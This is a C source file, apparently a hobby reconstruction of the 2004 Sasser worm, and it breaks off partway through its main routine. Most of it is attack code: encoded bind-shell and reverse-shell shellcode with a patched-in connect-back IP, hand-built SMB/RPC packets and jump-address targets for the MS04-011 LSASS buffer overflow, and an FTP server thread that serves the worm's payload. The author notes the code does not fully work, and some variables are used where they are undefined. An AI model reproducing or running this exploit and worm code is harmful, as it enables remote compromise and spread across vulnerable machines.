/*

Fun project to reconstruct the 2004 era Sasser worm

Exploit source from: houseofdabus 
FTP source from: https://stackoverflow.com/questions/23119615/coding-ftp-service-over-tcp-in-c-code
Netsky FTP call flow ( F-Secure ): https://www.f-secure.com/virus-info/v-pics/netsky_ftp.pdf
Sasser FTP call flow ( F-Secure ): https://www.f-secure.com/virus-info/v-pics/sasser_ftp.pdf
Source: https://archive.f-secure.com/weblog/archives/archive-052004.html
Help with FTP: http://cr.yp.to/ftp/retr.html
PASV mode: https://stackoverflow.com/questions/33245774/simple-ftp-client-c
PASV mode: https://github.com/zafercavdar/ftp-server/blob/master/CSftp.c
FTP source: https://github.com/pedro-vicente/lib_netsockets

Threads: 
https://www.bogotobogo.com/cplusplus/multithreading_win32A.php
https://www.codeproject.com/Articles/13557/Creating-Threads-using-the-CreateThread-API


Source code obviously doesn't work correctly.

Todo:

Delete references to reverse connection shellcode
only use bindshell
connect to bindshell and upload FTP commands via echo
Random IP number generator


Install function
Save attack logs in C:\win2.log 

*/

#include <windows.h>
#include <stdio.h> 
#include <string.h>
#include <stdlib.h>
#include <winsock.h>
#include <winsock2.h>
#pragma comment(lib,"wsock32.dll")

// reverse shellcode
unsigned char reverseshell[] =
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
"\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
"\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3\x9D\xC0\x71\x02\x99\x99\x99"
"\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE\xEA\xAB\xC6\xCD\x66\x8F\x12"
"\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99\x7B\x60\x18\x75\x09\x98\x99"
"\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF\x89\xC9\xC9\xC9\xC9\xD9\xC9"
"\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6\x99\x99\x98\xF1\x9B\x99\x9D"
"\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF\x81\x1C\x59\xEC\xD3\xF1\xFA"
"\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD\x14\xA5\xBD\xF3\x8C\xC0\x32"
"\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD\xBD\xA4\x10\xC5\xBD\xD1\x10"
"\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD\xBD\x89\xCD\xC9\xC8\xC8\xC8"
"\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66\xCF\x9D\x12\x55\xF3\x66\x66"
"\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66\xCF\x95\xC8\xCF\x12\xDC\xA5"
"\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB\xB9\x9A\x6C\xAA\x50\xD0\xD8"
"\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3\x4F\xED\x91\x58\x52\x94\x9A"
"\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3\x12\xC3\xBD\x9A\x44\xFF\x12"
"\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D\x12\x9A\x5C\x32\xC7\xC0\x5A"
"\x71\x99\x66\x66\x66\x17\xD7\x97\x75\xEB\x67\x2A\x8F\x34\x40\x9C"
"\x57\x76\x57\x79\xF9\x52\x74\x65\xA2\x40\x90\x6C\x34\x75\x60\x33"
"\xF9\x7E\xE0\x5F\xE0";

// bind shellcode
unsigned char bindshell[] =
"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
"\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"
"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"
"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"
"\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"
"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0"
"\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"
"\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B"
"\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9D\x4B\xAA\x59\x10\xDE\x9D"
"\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA"
"\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10"
"\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF"
"\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8"
"\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79"
"\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C"
"\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59"
"\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD"
"\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC"
"\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5"
"\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6"
"\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0"
"\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"
"\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99";



char req1[] =
"\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"
"\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"
"\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"
"\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"
"\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
"\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"
"\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00";

char req2[] =
"\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"
"\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"
"\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"
"\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
"\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"
"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
"\x2E\x00\x30\x00\x00\x00\x00\x00";


char req3[] =
"\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"
"\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"
"\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"
"\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"
"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"
"\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"
"\x00\x4F\x00\x44\x00\x00\x81\x19\x6A\x7A\xF2\xE4\x49\x1C\x28\xAF"
"\x30\x25\x74\x10\x67\x53\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"
"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"
"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"
"\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"
"\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00";


char req4[] =
"\x00\x00\x00\x5C\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5C\x00\x08\x00\x01\x00\x31\x00\x00"
"\x5C\x00\x5C\x00\x31\x00\x39\x00\x32\x00\x2E\x00\x31\x00\x36\x00"
"\x38\x00\x2E\x00\x31\x00\x2E\x00\x32\x00\x31\x00\x30\x00\x5C\x00"
"\x49\x00\x50\x00\x43\x00\x24"
"\x00\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

char req5[] =
"\x00\x00\x00\x64\xFF\x53\x4D\x42\xA2\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"
"\x00\x08\x40\x00\x18\xFF\x00\xDE\xDE\x00\x0E\x00\x16\x00\x00\x00"
"\x00\x00\x00\x00\x9F\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00"
"\x02\x00\x00\x00\x03\x11\x00\x00\x5C\x00\x6C\x00\x73\x00\x61\x00"
"\x72\x00\x70\x00\x63\x00\x00\x00";

char req6[] =
"\x00\x00\x00\x9C\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"
"\x00\x08\x50\x00\x10\x00\x00\x48\x00\x00\x00\x00\x04\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x48\x00\x54\x00\x02"
"\x00\x26\x00\x00\x40\x59\x00\x10\x5C\x00\x50\x00\x49\x00\x50\x00"
"\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x0B\x03\x10\x00\x00\x00"
"\x48\x00\x00\x00\x01\x00\x00\x00\xB8\x10\xB8\x10\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x01\x00\x6A\x28\x19\x39\x0C\xB1\xD0\x11"
"\x9B\xA8\x00\xC0\x4F\xD9\x2E\xF5\x00\x00\x00\x00\x04\x5D\x88\x8A"
"\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00";

char req7[] =
"\x00\x00\x0C\xF4\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"
"\x00\x08\x60\x00\x10\x00\x00\xA0\x0C\x00\x00\x00\x04\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\xA0\x0C\x54\x00\x02"
"\x00\x26\x00\x00\x40\xB1\x0C\x10\x5C\x00\x50\x00\x49\x00\x50\x00"
"\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x03\x10\x00\x00\x00"
"\xA0\x0C\x00\x00\x01\x00\x00\x00\x88\x0C\x00\x00\x00\x00\x09\x00"
"\xEC\x03\x00\x00\x00\x00\x00\x00\xEC\x03\x00\x00";
// room for shellcode here ...

char shit1[] =

"\x95\x14\x40\x00\x03\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x7C\x70\x40\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x78\x85\x13\x00\xAB\x5B\xA6\xE9";

char req8[] =
"\x00\x00\x10\xF8\xFF\x53\x4D\x42\x2F\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x60\x00\x0E\xFF\x00\xDE\xDE\x00\x40\x00\x00\x00\x00\xFF"
"\xFF\xFF\xFF\x08\x00\xB8\x10\x00\x00\xB8\x10\x40\x00\x00\x00\x00"
"\x00\xB9\x10\xEE\x05\x00\x00\x01\x10\x00\x00\x00\xB8\x10\x00\x00"
"\x01\x00\x00\x00\x0C\x20\x00\x00\x00\x00\x09\x00\xAD\x0D\x00\x00"
"\x00\x00\x00\x00\xAD\x0D\x00\x00";
// room for shellcode here ...

char req9[] =
"\x00\x00\x0F\xD8\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x18\x01"
"\x00\x08\x70\x00\x10\x00\x00\x84\x0F\x00\x00\x00\x04\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x84\x0F\x54\x00\x02"
"\x00\x26\x00\x00\x40\x95\x0F\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
"\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x02\x10\x00\x00\x00"
"\x84\x0F\x00\x00\x01\x00\x00\x00\x6C\x0F\x00\x00\x00\x00\x09\x00";


char shit3[] =
"\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";


#define LEN 3500
#define BUFSIZE 2000
#define NOP 0x90

struct targets {

int num;
char name[50];
long jmpaddr;

} ttarget[]= {

{ 0, "WinXP Professional    [universal] lsass.exe ", 0x01004600 }, // jmp esp addr
{ 1, "Win2k Professional    [universal] netrap.dll", 0x7515123c }, // jmp ebx addr
{ 2, "Win2k Advanced Server [SP4]       netrap.dll", 0x751c123c }, // jmp ebx addr

};

void usage(char *prog)
{
  int i;
  printf("Usage:\n\n");
  printf("%s <target> <victim IP> <bindport> [connectback IP] [options]\n\n", prog);
  printf("Targets:\n");
  for (i=0; i<3; i++)
  printf(" %d [0x%.8x]: %s\n", ttarget[i].num, ttarget[i].jmpaddr, ttarget[i].name);
  printf("\nOptions:\n");
  printf(" -t: Detect remote OS:\n");
  printf(" Windows 5.1 - WinXP\n");
  printf(" Windows 5.0 - Win2k\n\n");
  exit(0);
}


#define BUFFERSIZE 800
#define WSVERS MAKEWORD(2,0)

WSADATA wsadata;    

void InitWinsock()
{
  //WSASTARTUP
    if (WSAStartup(WSVERS, &wsadata) != 0)
    {
        WSACleanup();
        printf("WSAStartup failed\n");
        ExitProcess(0);
    }
}


DWORD WINAPI StartFTPD(LPVOID lpParameter)
{
    //INITIALIZATION
    struct sockaddr_in localaddr,remoteaddr;
    struct sockaddr_in remoteaddr_act;

    SOCKET s,ns;
    SOCKET s_data_act=0;

    char send_buffer[BUFFERSIZE],receive_buffer[BUFFERSIZE];
    char fileName[40];


    int n,bytes,addrlen;
    memset(&localaddr,0,sizeof(localaddr));//clean up the structure
    memset(&localaddr,0,sizeof(remoteaddr));//clean up the structure

    //SOCKET
    s = socket(PF_INET, SOCK_STREAM, 0);
    if (s <0)
    {
        printf("socket failed\n");
    }
    localaddr.sin_family = AF_INET;
    if (argc == 2) localaddr.sin_port = htons((u_short)atoi(argv[1]));
    else localaddr.sin_port = htons(5554);//default listening port
    localaddr.sin_addr.s_addr = INADDR_ANY;//server address should be local

    //BIND
    if (bind(s,(struct sockaddr *)(&localaddr),sizeof(localaddr)) != 0)
    {
        printf("Bind failed!\n");
        exit(0);
    }

    //LISTEN
    listen(s,5);

    while (1)
    {
        addrlen = sizeof(remoteaddr);

        //NEW SOCKET newsocket = accept
        ns = accept(s,(struct sockaddr *)(&remoteaddr),&addrlen);
        if (ns <0 ) break;
        printf("accepted a connection from client IP %s port %d \n",inet_ntoa(remoteaddr.sin_addr),ntohs(localaddr.sin_port));

        //Respond with welcome message
        sprintf(send_buffer,"220 Welcome to Sasser FTP\r\n\n");
        bytes = send(ns, send_buffer, strlen(send_buffer), 0);

        while (1)
        {
            n = 0;
            while (1)
            {
                //RECEIVE
                bytes = recv(ns, &receive_buffer[n], 1, 0);//receive byte by byte...

                //PROCESS REQUEST
                if ( bytes <= 0 ) break;
                if (receive_buffer[n] == '\n')
                { /*end on a LF*/
                    receive_buffer[n] = '\0';
                    break;
                }
                if (receive_buffer[n] != '\r') n++; /*ignore CRs*/
            }
            if ( bytes <= 0 ) break;

            printf("-->DEBUG: the message from client reads: '%s' \r\n", receive_buffer);

            /**
              * @brief  Exception handling
              */
            if(strncmp(receive_buffer,"USER",4)  && strncmp(receive_buffer,"PASS",4)    &&  strncmp(receive_buffer,"SYST",4)
                    &&strncmp(receive_buffer,"PORT",4)   && strncmp(receive_buffer,"STOR",4)    &&  strncmp(receive_buffer,"RETR",4)
                    &&strncmp(receive_buffer,"LIST",4)  &&  strncmp(receive_buffer,"NLST",4)    &&  strncmp(receive_buffer,"QUIT",4))
            {
                sprintf(send_buffer,"202 Command not implemented, superfluous at this site. \r\n");
                bytes = send(ns, send_buffer, strlen(send_buffer), 0);
            }


            if (strncmp(receive_buffer,"USER",4)==0)
            {
                printf("Logging in \n");
                sprintf(send_buffer,"331 Password required \r\n");
                bytes = send(ns, send_buffer, strlen(send_buffer), 0);
                if (bytes < 0) break;
            }

            if (strncmp(receive_buffer,"PASS",4)==0)
            {
                printf("Typing password (anything will do... \n");
                sprintf(send_buffer,"230 Public login sucessful \r\n");
                bytes = send(ns, send_buffer, strlen(send_buffer), 0);
                if (bytes < 0) break;
            }

            //PORT
            if(strncmp(receive_buffer,"PORT",4)==0)
            {
                s_data_act = socket(AF_INET, SOCK_STREAM, 0);
                //local variables
                unsigned char act_port[2];
                int act_ip[4], port_dec;
                char ip_decimal[40];
                sscanf(receive_buffer, "PORT %d,%d,%d,%d,%d,%d",&act_ip[0],&act_ip[1],&act_ip[2],&act_ip[3],(int*)&act_port[0],(int*)&act_port[1]);
                remoteaddr_act.sin_family=AF_INET;//local_data_addr_act
                sprintf(ip_decimal, "%d.%d.%d.%d", act_ip[0], act_ip[1], act_ip[2],act_ip[3]);
                printf("IP is %s\n",ip_decimal);
                remoteaddr_act.sin_addr.s_addr=inet_addr(ip_decimal);
                port_dec=act_port[0]*256+act_port[1];
                printf("port %d\n",port_dec);
                remoteaddr_act.sin_port=htons(port_dec);

                if (connect(s_data_act, (struct sockaddr *)&remoteaddr_act, (int) sizeof(struct sockaddr)) != 0)
                {
                    printf("trying connection in %s %d\n",inet_ntoa(remoteaddr_act.sin_addr),ntohs(remoteaddr_act.sin_port));
                    sprintf(send_buffer, "425 Something is wrong, can't start the active connection... \r\n");
                    bytes = send(ns, send_buffer, strlen(send_buffer), 0);

                    closesocket(s_data_act);
                }
                else
                {
                    sprintf(send_buffer, "200 Ok\r\n");
                    bytes = send(ns, send_buffer, strlen(send_buffer), 0);
                    printf("Data connection to client created (active connection) \n");
                }
            }

            /**
              * @brief  RETR
              */
            if((strncmp(receive_buffer,"RETR",4)==0))
            {
                memset(&fileName, 0, strlen(fileName));
                wy_fileName_collector(receive_buffer,   fileName);

                if(fopen(fileName,"r")==NULL)
                {
                    sprintf(send_buffer,"450 Requested file action not taken. \r\n");
                    bytes = send(ns, send_buffer, strlen(send_buffer), 0);
                }
                else
                {
                    FILE *fin=fopen(fileName,"r");//open tmp.txt file
                    sprintf(send_buffer,"150 Transfering... \r\n");
                    bytes = send(ns, send_buffer, strlen(send_buffer), 0);
                    char temp_buffer[80];
                    while (!feof(fin))
                    {
                        fgets(temp_buffer,78,fin);
                        sprintf(send_buffer,"%s",temp_buffer);
                        send(s_data_act, send_buffer, strlen(send_buffer), 0);
                    }
                    fclose(fin);
                    sprintf(send_buffer,"226 File transfer completed... \r\n");
                    bytes = send(ns, send_buffer, strlen(send_buffer), 0);
                }
                closesocket(s_data_act);
            }

            //QUIT
            if (strncmp(receive_buffer,"QUIT",4)==0)
            {
                printf("Quit \n");
                sprintf(send_buffer,"221 Connection closed by the FTP client\r\n");
                bytes = send(ns, send_buffer, strlen(send_buffer), 0);
                if (bytes < 0) break;
                closesocket(ns);
            }
        }
        //CLOSE SOCKET
        closesocket(ns);
        printf("disconnected from %s\n",inet_ntoa(remoteaddr.sin_addr));
    }
    closesocket(s);//it actually never gets to this point....use CTRL_C
    ExitThread(0);
}



int main(int argc, char *argv[])
{
  int i;
  int opt = 0;
  char *target;
  char hostipc[40];
  char hostipc2[40*2];

  unsigned short port;
  unsigned long ip;
  unsigned char *sc;

  char buf[LEN+1];
  char sendbuf[(LEN+1)*2];

  char req4u[sizeof(req4)+20];

  char screq[BUFSIZE+sizeof(req7)+1500+440];
  char screq2k[4348+4060];
  char screq2k2[4348+4060];

  char recvbuf[1600];

  char strasm[]="\x66\x81\xEC\x1C\x07\xFF\xE4";
  char strBuffer[BUFSIZE];

  unsigned int targetnum = 0;

  int len, sockfd;
  short dport = 445;
  struct hostent *he;
  struct sockaddr_in their_addr;
  char smblen;
  char unclen;


  printf("Sasser worm with MS04011 Lsasrv.dll RPC buffer overflow remote exploit embedded\n");

  InitWinsock();
  HANDLE hThread = CreateThread(
        NULL,    // Thread attributes
        0,       // Stack size (0 = use default)
        StartFTPD, // Thread start address
        NULL,    // Parameter to pass to the thread
        0,       // Creation flags
        NULL);   // Thread id
    if (hThread == NULL)
    {
        // Thread creation failed, More details can be retrieved by calling GetLastError()
        printf("failed to create thread!\n");
        return 1;
    }

    // Wait for thread to finish execution
    //WaitForSingleObject(hThread, INFINITE);
   

  if (argc < 4) {
    usage(argv[0]);
  }

  target = argv[2];
  sprintf((char *)hostipc,"\\\\%s\\ipc$", target); 

  for (i=0; i<40; i++) {
  hostipc2[i*2] = hostipc[i];
  hostipc2[i*2+1] = 0;
  }

  memcpy(req4u, req4, sizeof(req4)-1);
  memcpy(req4u+48, &hostipc2[0], strlen(hostipc)*2);
  memcpy(req4u+47+strlen(hostipc)*2, req4+87, 9);

  smblen = 52+(char)strlen(hostipc)*2;
  memcpy(req4u+3, &smblen, 1);

  unclen = 9 + (char)strlen(hostipc)*2;
  memcpy(req4u+45, &unclen, 1);

  if (argc > 4)
  if (!memcmp(argv[4], "-t", 2)) opt = 1;

  if ( (argc > 4) && !opt ) {
  port = htons(atoi(argv[3]))^(unsigned short int)0x9999;
  ip = inet_addr(argv[4])^(unsigned long int)0x99999999;
  memcpy(&reverseshell[118], &port, 2);
  memcpy(&reverseshell[111], &ip, 4);
  sc = reverseshell;
  } else {
  port = htons(atoi(argv[3]))^(unsigned short int)0x9999;
  memcpy(&bindshell[176], &port, 2);
  sc = bindshell;
  }


  if ( (atoi(argv[1]) == 1) || (atoi(argv[1]) == 2)) {
  memset(buf, NOP, LEN);

  //memcpy(&buf[2020], "\x3c\x12\x15\x75", 4);
  memcpy(&buf[2020], &ttarget[atoi(argv[1])].jmpaddr, 4);
  memcpy(&buf[2036], sc, strlen(sc));

  memcpy(&buf[2840], "\xeb\x06\xeb\x06", 4);
  memcpy(&buf[2844], &ttarget[atoi(argv[1])].jmpaddr, 4); // jmp ebx addr
  //memcpy(&buf[2844], "\x3c\x12\x15\x75", 4); // jmp ebx addr

  memcpy(&buf[2856], sc, strlen(sc));

  for (i=0; i<LEN; i++) {
  sendbuf[i*2] = buf[i];
  sendbuf[i*2+1] = 0;
  }
  sendbuf[LEN*2]=0;
  sendbuf[LEN*2+1]=0;

  memset(screq2k, 0x31, (BUFSIZE+sizeof(req7)+1500)*2);
  memset(screq2k2, 0x31, (BUFSIZE+sizeof(req7)+1500)*2);

  } else {
  memset(strBuffer, NOP, BUFSIZE);
  memcpy(strBuffer+160, sc, strlen(sc));
  memcpy(strBuffer+1980, strasm, strlen(strasm));
  *(long *)&strBuffer[1964]=ttarget[atoi(argv[1])].jmpaddr;
  }

  memset(screq, 0x31, BUFSIZE+sizeof(req7)+1500);


  if ((he=gethostbyname(argv[2])) == NULL) { // get the host info
  perror("[-] gethostbyname ");
  exit(1);
  }

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
  perror("socket");
  exit(1);
  }


  their_addr.sin_family = AF_INET;
  their_addr.sin_port = htons(dport);
  their_addr.sin_addr = *((struct in_addr *)he->h_addr);
  memset(&(their_addr.sin_zero), '\0', 8);

  printf("[*] Target: IP: %s: OS: %s\n", argv[2], ttarget[atoi(argv[1])].name);
  printf("[*] Connecting to %s:445 ... ", argv[2]);
  if (connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1) {
  printf("\n[-] Sorry, cannot connect to %s:445. Try again...\n", argv[2]);
  exit(1);
  }
  printf("OK\n");

  if (send(sockfd, req1, sizeof(req1)-1, 0) == -1) {
  printf("[-] Send failed\n");
  exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if (send(sockfd, req2, sizeof(req2)-1, 0) == -1) {
  printf("[-] Send failed\n");
  exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if (send(sockfd, req3, sizeof(req3)-1, 0) == -1) {
  printf("[-] Send failed\n");
  exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if ((argc > 5) || opt) {
  printf("[*] Detecting remote OS: ");
  for (i=0; i<12; i++) {
  printf("%c", recvbuf[48+i*2]);
  }
  printf("\n");
  exit(0);
  }

  printf("[*] Attacking ... ");
  if (send(sockfd, req4u, smblen+4, 0) == -1) {
  printf("[-] Send failed\n");
  exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if (send(sockfd, req5, sizeof(req5)-1, 0) == -1) {
  printf("[-] Send failed\n");
  exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);


  if (send(sockfd, req6, sizeof(req6)-1, 0) == -1) {
  printf("[-] Send failed\n");
  exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if ( (atoi(argv[1]) == 1) || (atoi(argv[1]) == 2)) {
  memcpy(screq2k, req8, sizeof(req8)-1);
  memcpy(screq2k+sizeof(req8)-1, sendbuf, (LEN+1)*2);

  memcpy(screq2k2, req9, sizeof(req9)-1);
  memcpy(screq2k2+sizeof(req9)-1, sendbuf+4348-sizeof(req8)+1, (LEN+1)*2-4348);

  memcpy(screq2k2+sizeof(req9)-1+(LEN+1)*2-4348-sizeof(req8)+1+206, shit3, sizeof(shit3)-1);

